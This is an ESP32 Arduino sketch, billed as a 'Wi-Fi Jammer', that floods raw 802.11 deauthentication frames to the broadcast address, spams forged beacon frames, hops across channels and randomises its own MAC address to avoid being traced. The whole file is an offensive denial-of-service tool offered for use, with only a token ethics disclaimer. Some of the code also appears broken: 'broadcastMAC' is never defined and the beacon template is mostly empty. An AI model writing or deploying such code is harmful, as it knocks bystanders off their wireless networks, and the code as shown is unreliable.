#include <WiFi.h>
#include "esp_wifi.h"

// This code was made by ViperFSFA
// **NOT FOR UNETHICAL USE**
// #HackThePlanet

// ======== CONFIGURATION ========
#define DEAUTH_PACKETS_PER_BURST 50  
#define CHANNEL_HOP_DELAY_MS 200     
#define BEACON_SPAM_COUNT 100        

// ======== PACKET TEMPLATES ========
// Deauth packet (RAW 802.11 frame)
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0xF0, 0xFF, 0x02, 0x00
};


uint8_t beaconPacket[109] = {
  0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04,
  0x05, 0x06, 0xC0, 0x6C, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04,

};

// ======== CORE FUNCTIONS ========
void sendDeauth(uint8_t* bssid) {
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);  
  for(int i=0; i<DEAUTH_PACKETS_PER_BURST; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, 26, false);
  }
}

void beaconSpam() {
  for(int i=0; i<BEACON_SPAM_COUNT; i++) {
    beaconPacket[10] = random(256);  
    esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 109, false);
  }
}

void channelHop() {
  static uint8_t channel = 1;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  channel = (channel % 13) + 1; 
}

// ======== MAIN SETUP ========
void setup() {
  Serial.begin(115200);
  

  WiFi.mode(WIFI_OFF);
  esp_wifi_init();
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  
  
  uint8_t newMAC[6];
  for(int i=0; i<6; i++) newMAC[i] = random(256);
  esp_wifi_set_mac(WIFI_IF_STA, newMAC);
  
  Serial.println("[ViperFW] Wi-Fi Jammer Activated");
}

// ======== MAIN LOOP ========
void loop() {

  sendDeauth(broadcastMAC);  // FF:FF:FF:FF:FF:FF
  
  beaconSpam();
  
  channelHop();
  
  delay(CHANNEL_HOP_DELAY_MS);
}
